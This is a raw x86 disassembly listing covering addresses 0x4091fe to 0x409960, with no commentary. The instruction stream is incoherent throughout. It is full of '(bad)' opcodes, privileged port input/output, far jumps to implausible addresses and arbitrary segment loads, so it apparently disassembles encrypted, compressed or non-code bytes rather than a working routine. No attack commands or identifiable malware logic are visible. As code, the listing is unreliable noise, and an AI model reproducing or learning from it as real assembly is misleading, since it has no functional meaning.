  4091fe:	jno    0x4091a1
  409200:	jecxz  0x4091c1
  409202:	repnz out 0x2f,al
  409205:	(bad)  
  409207:	ret    
  409208:	sbb    esi,esi
  40920a:	push   es
  40920b:	dec    esi
  40920c:	adc    dh,dh
  40920e:	cs push cs
  409210:	jns    0x40922c
  409212:	scas   eax,DWORD PTR es:[edi]
  409213:	and    BYTE PTR [ebp+0x6345b58a],0x1d
  40921a:	in     al,0x94
  40921c:	mov    al,BYTE PTR [edi-0x28]
  40921f:	int3   
  409220:	dec    esp
  409221:	sbb    DWORD PTR [esp+ebx*1+0xb6d15a5],esp
  409228:	push   ebp
  409229:	push   esp
  40922a:	add    esp,DWORD PTR ds:0x95a2ffe4
  409230:	cmp    al,0x2
  409232:	xlat   BYTE PTR ds:[ebx]
  409233:	jge    0x4091d0
  409235:	jge    0x40922f
  409237:	push   esp
  409238:	addr16 push 0xffffff9f
  40923b:	and    al,0x3a
  40923d:	stc    
  40923e:	xor    DWORD PTR [ebx+0x0],edx
  409241:	jp     0x4091da
  409243:	xchg   esp,eax
  409244:	bound  ebx,QWORD PTR [eax]
  409246:	xor    al,0xac
  409248:	mul    BYTE PTR [esi+0x31]
  40924b:	dec    esp
  40924c:	or     al,0xd6
  40924e:	jmp    0x792a68a7
  409253:	daa    
  409254:	aaa    
  409255:	in     eax,0x34
  409257:	push   es
  409258:	test   BYTE PTR [esi+0x45ea631e],ch
  40925e:	and    dh,BYTE PTR [esi+0x7bd754f2]
  409264:	imul   DWORD PTR [esi+0x6f0e2ae1]
  40926a:	pushf  
  40926b:	cmc    
  40926c:	ins    DWORD PTR es:[edi],dx
  40926d:	imul   ebp,DWORD PTR [ebx],0xffffffc3
  409270:	and    eax,0x8b7c8c2a
  409275:	mov    ebp,0xeb79ee5
  40927a:	dec    esi
  40927b:	xchg   BYTE PTR [ebx+0x8],cl
  40927e:	sub    al,0xfd
  409280:	push   es
  409281:	popf   
  409282:	pop    edi
  409283:	add    BYTE PTR [ecx],0xbd
  409286:	adc    eax,0xc09317fb
  40928b:	clc    
  40928c:	sbb    dh,BYTE PTR [ecx+0x37]
  40928f:	into   
  409290:	test   al,0x18
  409292:	push   edi
  409293:	out    0xc7,eax
  409295:	fcmovu st,st(3)
  409297:	sub    eax,0xf3026e1
  40929c:	add    eax,0xc57309ab
  4092a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4092a2:	in     al,0xe5
  4092a4:	jle    0x409290
  4092a6:	dec    esp
  4092a7:	ror    BYTE PTR [edi+0x5],cl
  4092aa:	mov    dh,0x9a
  4092ac:	in     al,0x1a
  4092ae:	xor    ebx,ecx
  4092b0:	rcl    DWORD PTR [edx],cl
  4092b2:	fwait
  4092b3:	inc    ebx
  4092b4:	mov    WORD PTR [edi-0x54],?
  4092b7:	cmp    al,0xfc
  4092b9:	push   cs
  4092ba:	rcr    DWORD PTR [ebp-0x3a],1
  4092bd:	cwde   
  4092be:	push   ecx
  4092bf:	mov    esi,0xb5c32e31
  4092c4:	dec    edx
  4092c5:	loope  0x409278
  4092c7:	push   edx
  4092c8:	retf   0x22b9
  4092cb:	dec    ebx
  4092cc:	loopne 0x4092e1
  4092ce:	jo     0x4092e0
  4092d0:	dec    eax
  4092d1:	sbb    eax,0x3932c770
  4092d6:	jo     0x4092a5
  4092d8:	inc    edi
  4092d9:	jo     0x409353
  4092db:	lds    edi,FWORD PTR [edi-0x6c]
  4092de:	retf   
  4092df:	fimul  WORD PTR [eax+0x7e]
  4092e2:	div    BYTE PTR [edx]
  4092e4:	xchg   ah,bl
  4092e6:	adc    cl,BYTE PTR [edi]
  4092e8:	or     eax,0x7baec264
  4092ed:	(bad)  
  4092ee:	mov    WORD PTR [ecx],gs
  4092f0:	popa   
  4092f1:	fistp  WORD PTR [ebp-0x61]
  4092f4:	retf   
  4092f5:	ret    0xaeab
  4092f8:	fild   QWORD PTR [edi]
  4092fa:	stos   DWORD PTR es:[edi],eax
  4092fb:	ffreep st(1)
  4092fd:	stos   DWORD PTR es:[edi],eax
  4092fe:	xchg   esp,eax
  4092ff:	mov    ebp,0x6fbe4762
  409304:	mov    esi,0x63941ba2
  409309:	ret    
  40930a:	push   edx
  40930b:	mov    esi,0x8233143f
  409310:	pop    esp
  409311:	fimul  DWORD PTR [ebx]
  409313:	jg     0x409351
  409315:	xchg   ah,cl
  409317:	popa   
  409318:	shr    DWORD PTR [ebx-0x1b],cl
  40931b:	popf   
  40931c:	cwde   
  40931d:	push   es
  40931e:	mov    ds:0x2b97994a,al
  409323:	adc    eax,0xc4f3d175
  409328:	(bad)  
  409329:	xchg   esp,eax
  40932a:	pop    ecx
  40932b:	xor    eax,0xb61eac98
  409330:	ins    BYTE PTR es:[edi],dx
  409331:	jne    0x4092e3
  409333:	lea    ebx,[esi-0x56704f28]
  409339:	xchg   esi,eax
  40933a:	inc    edx
  40933b:	fisubr WORD PTR [esi+edx*8-0x3c]
  40933f:	and    al,0x3d
  409341:	xchg   ebp,eax
  409342:	clc    
  409343:	(bad)  
  409344:	hlt    
  409345:	xor    ebp,DWORD PTR [ecx-0xb]
  409348:	xchg   ecx,eax
  409349:	std    
  40934a:	(bad)  [ecx+0x3e883953]
  409350:	mov    ch,0x91
  409352:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409353:	(bad)  
  409354:	mov    al,ds:0x6f551b7e
  409359:	cs hlt 
  40935b:	mov    ds:0x9796da9d,eax
  409360:	push   esi
  409361:	and    BYTE PTR [eax-0x1b1568c6],dh
  409367:	stos   BYTE PTR es:[edi],al
  409368:	mov    eax,DWORD PTR [eax+0x2768fd0a]
  40936e:	in     eax,0x76
  409370:	retf   
  409371:	rcl    DWORD PTR [ebp+0x74],0x64
  409375:	mov    eax,0xff732a4e
  40937a:	cmp    eax,0x7eeb6ac7
  40937f:	nop
  409380:	cwde   
  409381:	mul    BYTE PTR [ecx+0x2]
  409384:	xchg   edi,eax
  409385:	test   BYTE PTR [edx-0x12],0x12
  409389:	push   ecx
  40938a:	mov    ss,WORD PTR [ebx+edx*8+0x7b8fd042]
  409391:	inc    edi
  409392:	pop    ss
  409393:	repz shr eax,1
  409396:	not    BYTE PTR [ebx+0x6ec9ce46]
  40939c:	rol    DWORD PTR [eax-0x5df6ed1d],0x7c
  4093a3:	and    esp,esp
  4093a5:	or     DWORD PTR [eax-0x2def552a],0x9d47ea98
  4093af:	imul   ecx,DWORD PTR es:[ebx-0x79c6aa74],0xffffffda
  4093b7:	mov    ds,esi
  4093b9:	cmp    al,ch
  4093bb:	inc    esp
  4093bc:	inc    edi
  4093bd:	in     eax,0x92
  4093bf:	popa   
  4093c0:	push   esp
  4093c1:	shl    bh,0x30
  4093c4:	popa   
  4093c5:	dec    esi
  4093c6:	pop    esi
  4093c7:	ins    BYTE PTR es:[edi],dx
  4093c8:	xchg   sp,ax
  4093ca:	jg     0x40942e
  4093cc:	fnsave [ebp-0x3e681d1d]
  4093d2:	ror    DWORD PTR [ebp+0x2ffd904a],cl
  4093d8:	enter  0xd9fc,0xab
  4093dc:	aas    
  4093dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4093de:	inc    esi
  4093df:	(bad)  
  4093e0:	pop    esi
  4093e1:	sub    eax,0xe87b98bf
  4093e6:	test   al,0x90
  4093e8:	jb     0x4093ec
  4093ea:	retf   0x4b58
  4093ed:	repnz sbb esp,edx
  4093f0:	sub    edx,DWORD PTR [esi-0x50fa6c8]
  4093f6:	popa   
  4093f7:	lods   eax,DWORD PTR ds:[esi]
  4093f8:	jbe    0x4093ea
  4093fa:	imul   edx,DWORD PTR [ecx-0x54],0x31
  4093fe:	mov    BYTE PTR [ebx+0x6c],bl
  409401:	es out 0x7f,al
  409404:	ins    BYTE PTR es:[edi],dx
  409405:	rcl    DWORD PTR [esi],cl
  409407:	jb     0x409466
  409409:	adc    BYTE PTR [eax],bh
  40940b:	xchg   edx,eax
  40940c:	fisttp DWORD PTR [esi+0x47e01cd]
  409412:	jns    0x40947c
  409414:	xchg   esi,eax
  409415:	mov    esp,0x85d154e1
  40941a:	test   eax,0xc144b940
  40941f:	stos   DWORD PTR es:[edi],eax
  409420:	xchg   ebp,eax
  409421:	sub    bl,BYTE PTR [ecx-0x4f]
  409424:	pop    ecx
  409425:	xchg   ebp,eax
  409426:	sbb    ecx,DWORD PTR [ecx+eax*4]
  409429:	mov    ebp,0xd559bd5f
  40942e:	sub    eax,0x832a7441
  409433:	(bad)  
  409434:	xor    BYTE PTR [esi-0x3e],al
  409437:	fwait
  409438:	dec    esi
  409439:	mov    al,0x77
  40943b:	mov    ebp,DWORD PTR [edx+0x10]
  40943e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40943f:	cmp    al,0xb4
  409441:	clc    
  409442:	pop    eax
  409443:	in     al,0xa
  409445:	(bad)  
  409446:	jmp    0xe9d3a6b8
  40944b:	(bad)  
  40944c:	push   ebp
  40944d:	inc    ecx
  40944e:	int3   
  40944f:	call   0x28603181
  409454:	cmp    cl,BYTE PTR [ebp+0x16781dc7]
  40945a:	mov    DWORD PTR [edx-0x35],edi
  40945d:	dec    esp
  40945e:	into   
  40945f:	ror    BYTE PTR [eax+0x49],1
  409462:	fidivr DWORD PTR [esi+edx*4+0x4009e538]
  409469:	lods   eax,DWORD PTR ds:[esi]
  40946a:	inc    esp
  40946b:	adc    DWORD PTR [ebx],0xffffffae
  40946e:	in     eax,dx
  40946f:	or     edi,DWORD PTR [ecx]
  409471:	pop    esi
  409472:	cld    
  409473:	xchg   ecx,eax
  409474:	mov    esp,0x961b4c18
  409479:	arpl   WORD PTR ds:0x857680c2,ax
  40947f:	lods   al,BYTE PTR ds:[esi]
  409480:	rcr    BYTE PTR [edi],0xa2
  409483:	pop    es
  409484:	or     DWORD PTR [ebx-0x451d2123],0xf1b8a491
  40948e:	out    dx,al
  40948f:	iret   
  409490:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409491:	lea    esi,[ebx]
  409493:	aad    0x39
  409495:	mov    ecx,0xaba11bbe
  40949a:	into   
  40949b:	pushf  
  40949c:	pop    ebp
  40949d:	adc    dh,BYTE PTR ds:0xd209319d
  4094a3:	pop    eax
  4094a4:	inc    ecx
  4094a5:	cmp    ebx,DWORD PTR [ecx+ecx*4]
  4094a8:	dec    ebp
  4094aa:	int    0x69
  4094ac:	mov    ebx,ebp
  4094ae:	stos   DWORD PTR es:[edi],eax
  4094af:	dec    ecx
  4094b0:	xor    bh,BYTE PTR ds:0x9fc391af
  4094b6:	sub    BYTE PTR [ecx-0x71],dh
  4094b9:	pop    ebx
  4094ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4094bb:	lahf   
  4094bc:	mov    WORD PTR [esi-0x22],gs
  4094bf:	pop    edx
  4094c0:	sbb    edx,DWORD PTR [edx]
  4094c2:	jae    0x40948d
  4094c4:	pop    ebp
  4094c5:	repnz add eax,0x43c58b9f
  4094cb:	pop    ds
  4094cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4094cd:	out    0x60,eax
  4094cf:	sub    DWORD PTR [eax+eiz*4],edx
  4094d2:	dec    ecx
  4094d3:	cmp    esp,DWORD PTR [esi+0x22]
  4094d6:	aam    0xa6
  4094d8:	cmp    al,0x15
  4094da:	mov    WORD PTR [ebp+0x3832eed],ss
  4094e0:	add    ch,BYTE PTR [ebp-0x1ab57f26]
  4094e6:	cmp    BYTE PTR [esi+0x21],bl
  4094e9:	std    
  4094ea:	inc    esp
  4094eb:	int    0xde
  4094ed:	hlt    
  4094ee:	push   eax
  4094ef:	and    dl,BYTE PTR [esi+edx*8+0x70]
  4094f3:	jne    0x40955a
  4094f5:	leave  
  4094f6:	out    0x18,eax
  4094f8:	cmp    DWORD PTR [edi+edi*8],ebp
  4094fb:	std    
  4094fc:	gs aas 
  4094fe:	pop    ds
  4094ff:	sar    BYTE PTR [ecx],cl
  409501:	cmp    bh,BYTE PTR [ebp-0x79dc3f70]
  409507:	mov    eax,DWORD PTR [edi+0x53]
  40950a:	push   ecx
  40950b:	bound  esp,QWORD PTR [ebx]
  40950d:	idiv   ecx
  40950f:	cmp    al,0x7b
  409511:	(bad)  
  409512:	xlat   BYTE PTR ds:[ebx]
  409513:	(bad)  
  409514:	arpl   di,sp
  409516:	retf   
  409517:	adc    eax,0x790cbcda
  40951c:	sub    eax,0x8c77b040
  409521:	pop    edi
  409522:	xlat   BYTE PTR ds:[ebx]
  409523:	fcmovnb st,st(3)
  409525:	iret   
  409526:	jo     0x409573
  409528:	nop
  409529:	lahf   
  40952a:	(bad)  
  40952b:	jo     0x409561
  40952d:	or     al,0xc0
  40952f:	aaa    
  409530:	leave  
  409531:	mov    esp,ss
  409533:	jg     0x409551
  409535:	mov    ds:0xd41510e6,al
  40953a:	jle    0x4094d3
  40953c:	or     bl,BYTE PTR [ebx-0x52]
  40953f:	sbb    ecx,DWORD PTR [ecx-0x1a]
  409542:	xchg   ecx,eax
  409543:	cmp    BYTE PTR [ebp-0x77],cl
  409546:	jp     0x4094fb
  409548:	dec    DWORD PTR cs:[ecx+0x1]
  40954c:	mov    bl,0x9
  40954e:	rcr    DWORD PTR gs:[edi],0x27
  409552:	add    eax,DWORD PTR [ebp+0x1a358bf6]
  409558:	dec    ebx
  409559:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40955a:	push   es
  40955b:	dec    edi
  40955c:	add    BYTE PTR [ebp+0x5e],cl
  40955f:	push   eax
  409560:	jno    0x40955c
  409562:	aam    0x58
  409564:	aaa    
  409565:	mov    eax,DWORD PTR [edx]
  409567:	retf   0x72f5
  40956a:	dec    esi
  40956b:	xchg   esp,eax
  40956c:	sbb    ah,BYTE PTR [ebx-0x7f]
  40956f:	addr16 push esi
  409571:	in     eax,0x22
  409573:	sbb    DWORD PTR [edi+eiz*1+0x73],edi
  409577:	out    dx,al
  409578:	and    ebp,eax
  40957a:	(bad)  
  40957b:	or     BYTE PTR [ecx],ah
  40957d:	mov    al,ds:0xcb30d1a0
  409582:	cmp    al,0xcd
  409585:	push   ebx
  409586:	es cmp ebp,eax
  409589:	xor    ebx,0xb0a9da6c
  40958f:	pop    ds
  409590:	push   0xde2b469
  409595:	and    edi,DWORD PTR [esi]
  409597:	ror    DWORD PTR [ebx],1
  409599:	fs ss loop 0x40955f
  40959d:	sub    dh,BYTE PTR [ebx]
  40959f:	mov    ah,0xb
  4095a1:	popa   
  4095a2:	add    al,dh
  4095a4:	mov    WORD PTR [edx+0x6a],cs
  4095a7:	pop    esp
  4095a8:	pusha  
  4095a9:	xchg   BYTE PTR [edi+0x31],bh
  4095ac:	imul   ebx,DWORD PTR [edi-0x50],0xffffffd5
  4095b0:	arpl   WORD PTR [edi-0x63],di
  4095b3:	mov    ebx,0x8f0bc986
  4095b8:	into   
  4095b9:	fldcw  WORD PTR [eax+0x65]
  4095bc:	push   ecx
  4095bd:	sahf   
  4095be:	push   esi
  4095bf:	mov    al,0x8c
  4095c1:	cmp    al,0x36
  4095c3:	mov    eax,DWORD PTR [esi-0x3f16af88]
  4095c9:	mov    ds:0x153c37b4,eax
  4095ce:	pop    ds
  4095cf:	or     ah,bl
  4095d1:	call   0xf7e4:0xbcb3ca27
  4095d8:	lea    ecx,[ebp-0x43]
  4095db:	mov    edx,0xd7d2fc8e
  4095e0:	das    
  4095e1:	push   ecx
  4095e2:	mov    edx,DWORD PTR [esi]
  4095e4:	mov    cs,WORD PTR [edi+0xd]
  4095e7:	sub    eax,0xab1bd716
  4095ec:	leave  
  4095ed:	jmp    0xab23eff5
  4095f2:	nop
  4095f3:	sub    al,0x3f
  4095f5:	ins    BYTE PTR es:[edi],dx
  4095f6:	mov    ds:0x5d4a36db,eax
  4095fb:	dec    ebp
  4095fc:	pop    ecx
  4095fd:	pop    eax
  4095fe:	and    bh,BYTE PTR [ebp+eax*8+0x1c]
  409602:	adc    eax,0x9fba4196
  409607:	loopne 0x40966d
  409609:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40960a:	lods   eax,DWORD PTR ds:[esi]
  40960b:	jmp    0x40967d
  40960d:	sub    DWORD PTR [eax],edx
  40960f:	pop    edi
  409610:	into   
  409611:	jo     0x409669
  409613:	cmp    edx,esp
  409615:	jno    0x4095d3
  409617:	jne    0x4095a9
  409619:	add    esi,ebx
  40961b:	fsub   QWORD PTR [ebp-0x73]
  40961e:	dec    esp
  40961f:	adc    BYTE PTR [esi+0x6b],bl
  409622:	not    DWORD PTR [ecx+0x61]
  409625:	fadd   DWORD PTR [edi]
  409627:	pushf  
  409628:	sbb    DWORD PTR [ebp-0x1a],eax
  40962b:	mov    ch,0x6c
  40962d:	cdq    
  40962e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40962f:	nop
  409630:	or     BYTE PTR [ecx],dl
  409632:	stos   DWORD PTR es:[edi],eax
  409633:	(bad)  
  409634:	int3   
  409635:	stos   BYTE PTR es:[edi],al
  409636:	dec    ebx
  409637:	je     0x40966c
  409639:	mov    ah,0x51
  40963b:	push   0x1cef342b
  409640:	pop    ecx
  409641:	cmp    al,0x19
  409643:	stos   BYTE PTR es:[edi],al
  409644:	pop    ecx
  409645:	push   ecx
  409646:	hlt    
  409647:	ins    BYTE PTR es:[edi],dx
  409648:	mov    bl,0xf1
  40964a:	or     ch,BYTE PTR [edx+eiz*2]
  40964d:	mov    ds:0xa74efd63,eax
  409652:	ret    
  409653:	(bad)  [esi]
  409655:	sbb    esi,DWORD PTR [ebx]
  409657:	jae    0x4095f9
  409659:	jae    0x4095e8
  40965b:	dec    ebx
  40965c:	xlat   BYTE PTR ds:[ebx]
  40965d:	xor    eax,DWORD PTR [edi]
  40965f:	sti    
  409660:	jmp    0xa903a61e
  409665:	sbb    cl,BYTE PTR [ecx]
  409667:	jb     0x4095ee
  409669:	xchg   esi,eax
  40966a:	(bad)  [edi]
  40966c:	aam    0x4b
  40966e:	fist   DWORD PTR [edx-0x18]
  409671:	mov    cl,0x1
  409673:	rcr    BYTE PTR [ebx],0x6d
  409676:	cmp    DWORD PTR [ebp+0x654d24e9],ebx
  40967c:	add    eax,0x173caa38
  409681:	mov    ds:0x96338163,al
  409686:	loope  0x409611
  409688:	div    DWORD PTR [ebp+ebx*1+0x715a9414]
  40968f:	mov    edx,DWORD PTR [ecx-0xe7e9532]
  409695:	cli    
  409696:	xor    dl,cl
  409698:	inc    esp
  409699:	clc    
  40969a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40969b:	retf   
  40969c:	in     eax,dx
  40969d:	mov    dl,0x41
  40969f:	sub    al,0xc5
  4096a1:	bound  edi,QWORD PTR [esi-0x4927e30a]
  4096a7:	imul   ebx,esi,0x6dc87c33
  4096ad:	dec    ecx
  4096ae:	push   ds
  4096af:	cs adc al,0xd8
  4096b2:	mov    edx,0x72ae04a7
  4096b7:	mov    ebp,0xfd6dbff
  4096bc:	in     eax,0xc9
  4096be:	or     bh,BYTE PTR [esi-0x41c9a2b2]
  4096c4:	lds    ebx,FWORD PTR [ebp+eax*4-0x71]
  4096c8:	imul   esi,DWORD PTR [edx+0x65],0x19
  4096cc:	jnp    0x409734
  4096ce:	adc    bh,BYTE PTR [ecx+0x73]
  4096d1:	popf   
  4096d2:	ror    BYTE PTR [ebx-0x26],cl
  4096d5:	out    dx,al
  4096d6:	hlt    
  4096d7:	sub    edx,DWORD PTR [edi+0x6b]
  4096da:	or     DWORD PTR [esi-0x29972abf],ebx
  4096e0:	mov    ecx,0xe0d9cc65
  4096e5:	and    DWORD PTR [edx+ebp*8],ebx
  4096e8:	aaa    
  4096e9:	cld    
  4096ea:	push   esp
  4096eb:	fadd   QWORD PTR [edi]
  4096ed:	or     dl,BYTE PTR [ebp+0x1e309a9f]
  4096f3:	stos   DWORD PTR es:[edi],eax
  4096f4:	test   al,0x22
  4096f6:	out    dx,al
  4096f7:	pop    ss
  4096f8:	mov    ebp,eax
  4096fa:	pusha  
  4096fb:	aam    0xe8
  4096fd:	(bad)  
  4096fe:	push   ebx
  4096ff:	pop    ebx
  409700:	fisttp QWORD PTR [eax+0x5a]
  409703:	pop    ebp
  409704:	mov    BYTE PTR [esi+0x532a22f8],ch
  40970a:	mov    cl,0x17
  40970c:	loop   0x40969c
  40970e:	xchg   edx,eax
  40970f:	jle    0x40971e
  409711:	scas   al,BYTE PTR es:[edi]
  409712:	add    edi,edi
  409714:	mov    ds:0x9b6198bd,eax
  409719:	int    0xbe
  40971b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40971c:	jge    0x40971a
  40971e:	sbb    eax,0xeffe298f
  409723:	or     dl,BYTE PTR [esi-0x279568de]
  409729:	loopne 0x409709
  40972b:	(bad)  
  40972d:	and    BYTE PTR [ecx-0x49774930],bl
  409733:	fisttp DWORD PTR [edx-0x35239672]
  409739:	dec    ecx
  40973a:	lahf   
  40973b:	lahf   
  40973c:	fninit 
  40973e:	push   cs
  40973f:	(bad)  
  409740:	js     0x40977c
  409742:	inc    eax
  409743:	adc    eax,esi
  409745:	into   
  409746:	jns    0x40975e
  409748:	push   ebp
  409749:	mov    ds:0x3b47f6f2,al
  40974e:	mov    ch,0xbe
  409750:	push   0xfffffff1
  409752:	mov    eax,ds:0x2afe1604
  409757:	push   cs
  409758:	div    cl
  40975a:	adc    edi,DWORD PTR [ebx+0x0]
  40975d:	ins    DWORD PTR es:[edi],dx
  40975e:	xor    eax,0x7f0ebb3f
  409763:	push   ds
  409764:	mov    ?,WORD PTR [esi]
  409766:	pop    ebp
  409767:	test   BYTE PTR [edx-0x12fe88bd],0xc8
  40976e:	and    edx,DWORD PTR [ecx-0x66]
  409771:	retf   
  409772:	push   ebx
  409773:	cli    
  409774:	jg     0x4097a6
  409776:	mov    ch,0xeb
  409778:	loopne 0x40977e
  40977a:	sbb    DWORD PTR [edx-0x54],edx
  40977d:	push   cs
  40977e:	xor    DWORD PTR [ebx+0x5a],esp
  409781:	jmp    0xcca1:0xffbccca9
  409788:	imul   ebx,DWORD PTR [ecx+0x4c],0xeb649979
  40978f:	xlat   BYTE PTR ds:[ebx]
  409790:	das    
  409791:	cli    
  409792:	dec    ebx
  409793:	stos   DWORD PTR es:[edi],eax
  409794:	lods   eax,DWORD PTR ds:[esi]
  409795:	xchg   edx,eax
  409796:	push   0x71
  409798:	sbb    eax,0xbc5875ef
  40979d:	jge    0x409812
  40979f:	pushaw 
  4097a1:	stc    
  4097a2:	es jg  0x409746
  4097a5:	cwde   
  4097a6:	shr    ch,cl
  4097a8:	in     al,0xaf
  4097aa:	pop    edx
  4097ab:	outs   dx,BYTE PTR ds:[esi]
  4097ac:	or     DWORD PTR [edi-0x28],edi
  4097af:	stos   DWORD PTR es:[edi],eax
  4097b0:	pop    ebp
  4097b1:	mov    ds:0x7874ed55,al
  4097b6:	pop    esp
  4097b7:	xchg   ecx,eax
  4097b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4097b9:	test   esi,edi
  4097bb:	inc    ebx
  4097bc:	push   ds
  4097bd:	xchg   esp,eax
  4097be:	aas    
  4097bf:	push   ebp
  4097c0:	pop    esp
  4097c1:	jbe    0x409828
  4097c3:	enter  0x5521,0xd9
  4097c7:	iret   
  4097c8:	jae    0x409750
  4097ca:	(bad)
  4097cd:	xchg   edi,eax
  4097ce:	mov    ebx,0x6e72bad1
  4097d3:	bound  ebp,QWORD PTR [edi]
  4097d5:	xchg   ecx,eax
  4097d6:	and    BYTE PTR [ecx+0x7233c148],0xb4
  4097dd:	mov    WORD PTR [eax],cs
  4097df:	mov    dl,0xed
  4097e1:	mov    bh,0xb
  4097e3:	xor    BYTE PTR [ecx],0x5a
  4097e6:	hlt    
  4097e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4097e8:	pop    ebp
  4097e9:	stos   DWORD PTR es:[edi],eax
  4097ea:	fldcw  WORD PTR [ecx+0x28e93841]
  4097f0:	addr16 xchg ecx,eax
  4097f2:	test   BYTE PTR [esi-0x66],ch
  4097f5:	pop    eax
  4097f6:	push   ss
  4097f7:	adc    eax,0x1a2cdd65
  4097fc:	push   ebx
  4097fd:	inc    eax
  4097fe:	xchg   edx,eax
  4097ff:	dec    esi
  409800:	enter  0x1e75,0x4a
  409804:	aas    
  409805:	rol    BYTE PTR [esi+0x7a],1
  409808:	and    DWORD PTR [esi+eiz*4],esp
  40980b:	mov    ds:0xb5516190,al
  409810:	std    
  409811:	jns    0x409890
  409813:	add    edx,DWORD PTR [eax]
  409815:	fstp   TBYTE PTR [esi-0x5d172b40]
  40981b:	inc    edx
  40981c:	pop    ss
  40981d:	outs   dx,BYTE PTR ds:[esi]
  40981e:	xchg   esp,eax
  40981f:	push   ebx
  409820:	(bad)  
  409822:	jb     0x4097ac
  409824:	cmc    
  409825:	inc    esp
  409826:	arpl   WORD PTR [edx+ecx*8-0x45],sp
  40982a:	loope  0x409879
  40982c:	jmp    0xa4c8:0xa8134db3
  409833:	or     ah,ch
  409835:	mov    edi,0xd7815938
  40983a:	outs   dx,BYTE PTR ds:[esi]
  40983b:	mov    ds:0x31e9f7fe,eax
  409840:	fadd   QWORD PTR [ebp-0x725453f0]
  409847:	jle    0x4098c0
  409849:	mov    ebp,0xd5113f0
  40984e:	sub    al,0x2b
  409850:	cwde   
  409851:	lods   eax,DWORD PTR ds:[esi]
  409852:	jae    0x4097d4
  409854:	test   BYTE PTR [ecx],bl
  409856:	fiadd  DWORD PTR gs:[edx+0x6e]
  40985a:	mov    ecx,0x2e753bb1
  40985f:	push   edi
  409860:	mov    eax,ds:0xfdb55514
  409865:	test   al,0x89
  409867:	xchg   BYTE PTR [eax],al
  409869:	dec    esi
  40986a:	push   esp
  40986b:	loopne 0x409843
  40986d:	es es aas 
  409870:	scas   al,BYTE PTR es:[edi]
  409871:	add    eax,0xef727f99
  409876:	hlt    
  409877:	mov    ah,0xdf
  409879:	sub    eax,0x44d9338f
  40987e:	pop    ebx
  40987f:	test   al,0xfd
  409881:	cmp    al,0xec
  409883:	jnp    0x40980a
  409885:	jo     0x4098a1
  409887:	add    dh,BYTE PTR [edx+0x2e]
  40988a:	pop    es
  40988b:	pop    edx
  40988c:	ret    0x7056
  40988f:	dec    ecx
  409890:	ret    0x3b0e
  409893:	es mov ch,0x5a
  409896:	test   al,bh
  409898:	add    BYTE PTR [esp+ebx*2],ah
  40989b:	jle    0x4098a8
  40989d:	xor    eax,0x86d354ac
  4098a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4098a3:	sub    al,0xe9
  4098a5:	dec    edx
  4098a6:	jp     0x4098e6
  4098a8:	add    al,0x1e
  4098aa:	pop    DWORD PTR [eax]
  4098ac:	dec    bl
  4098ae:	pop    edx
  4098af:	stc    
  4098b0:	dec    eax
  4098b1:	mov    ah,0xee
  4098b3:	gs xchg esi,eax
  4098b5:	jo     0x4098c1
  4098b7:	ss push es
  4098b9:	sbb    edi,eax
  4098bb:	scas   al,BYTE PTR es:[edi]
  4098bc:	lahf   
  4098bd:	dec    edx
  4098be:	add    BYTE PTR [esi-0x1ac9cda5],bh
  4098c4:	(bad)  
  4098c5:	repz neg BYTE PTR [eax]
  4098c8:	pop    esp
  4098c9:	dec    esp
  4098ca:	not    ah
  4098cc:	push   edx
  4098cd:	push   ds
  4098ce:	push   esp
  4098cf:	lds    edi,FWORD PTR [eax+0x5a]
  4098d2:	cli    
  4098d3:	cmc    
  4098d4:	enter  0xce22,0x1c
  4098d8:	sahf   
  4098d9:	rcr    DWORD PTR [esi*4+0x353657a7],0x1
  4098e1:	cmc    
  4098e2:	push   esp
  4098e3:	dec    eax
  4098e4:	push   ecx
  4098e5:	fdivr  DWORD PTR [edi-0x39]
  4098e8:	pop    ds
  4098e9:	lock sub BYTE PTR [edx],dh
  4098ec:	scas   al,BYTE PTR es:[edi]
  4098ed:	sbb    ecx,DWORD PTR [edi+0x50]
  4098f0:	sbb    eax,0x79868a2e
  4098f5:	rcr    DWORD PTR [edi+0x7c587aff],1
  4098fb:	ins    BYTE PTR es:[edi],dx
  4098fc:	data16 js 0x40989b
  4098ff:	xor    ebx,eax
  409901:	mov    dh,BYTE PTR [ecx-0x71e62603]
  409907:	leave  
  409908:	out    dx,al
  409909:	adc    BYTE PTR [ebp-0x13],cl
  40990c:	ret    
  40990d:	jnp    0x4098e0
  40990f:	dec    ecx
  409910:	jp     0x40989e
  409912:	iret   
  409913:	in     eax,dx
  409914:	loopne 0x4098bc
  409916:	out    0x50,eax
  409918:	sbb    al,0xbb
  40991a:	inc    esp
  40991b:	dec    esp
  40991c:	scas   al,BYTE PTR es:[edi]
  40991d:	and    al,0x5e
  40991f:	add    ecx,DWORD PTR [esi-0x72e728c7]
  409925:	in     eax,dx
  409926:	and    al,0xb3
  409928:	aas    
  409929:	xchg   edi,eax
  40992a:	pop    ebx
  40992b:	adc    DWORD PTR [ebx+0x5490fa35],eax
  409931:	add    BYTE PTR [ebp+0x5c],bl
  409934:	pusha  
  409935:	ss sub al,0x9b
  409938:	mov    eax,ds:0xa2cc6a95
  40993d:	jae    0x4099a2
  40993f:	xor    eax,0xf9c5a227
  409944:	pop    ebp
  409945:	clc    
  409946:	sbb    ebx,DWORD PTR [ecx+0x4b9c321e]
  40994c:	sbb    DWORD PTR [edi+esi*4],0x22
  409950:	xor    al,0x26
  409952:	mov    ss,WORD PTR [eax]
  409954:	dec    edi
  409955:	mov    ds:0xda92de7e,eax
  40995a:	mov    dh,0x98
  40995c:	jo     0x409905
  40995e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40995f:	dec    ebx
  409960:	inc    ebx
